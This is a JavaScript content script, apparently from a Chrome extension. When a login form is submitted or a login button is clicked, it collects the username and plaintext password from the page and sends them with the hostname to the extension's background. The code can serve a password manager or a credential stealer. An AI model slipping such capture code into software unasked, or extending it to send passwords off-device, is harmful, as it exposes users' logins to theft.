function detectAndSendCredentials() {
    const allInputs = Array.from(document.querySelectorAll("input"));
    let username = "unknown";
    let password = null;

    // Look for username inputs (class "username" preferred, then email, then text)
    for (const input of allInputs) {
        if (input.type === "password" && password === null && input.value.trim() !== "") {
            password = input.value;
        } else if (input.type !== "hidden" && input.type !== "password" && input.value.trim() !== "") {
            if (input.classList.contains("username")) {
                // Prefer input with class 'username'
                username = input.value;
                break; // stop further checks once we find the username with class "username"
            } else if (input.type === "email" && username === "unknown") {
                // Prefer email input over text
                username = input.value;
            } else if (input.type === "text" && username === "unknown") {
                // Fall back to text if no email or class "username" found
                username = input.value;
            }
        }
    }

    if (password !== null) {
        const hostname = window.location.hostname;

        chrome.runtime.sendMessage({
            type: "login_attempt",
            site: hostname,
            username: username,
            password: password
        });
    }
}

// Listen for form submits
document.addEventListener("submit", (e) => {
    detectAndSendCredentials();
}, true);

// Listen for clicks on login buttons
document.addEventListener("click", (e) => {
    const target = e.target;
    if (target.tagName === "BUTTON" || target.tagName === "INPUT") {
        const text = (target.innerText || target.value || "").toLowerCase();
        if (text.includes("login") || text.includes("sign in") || text.includes("log in")) {
            setTimeout(() => {
                detectAndSendCredentials();
            }, 500); // wait a bit in case JS fills inputs
        }
    }
}, true);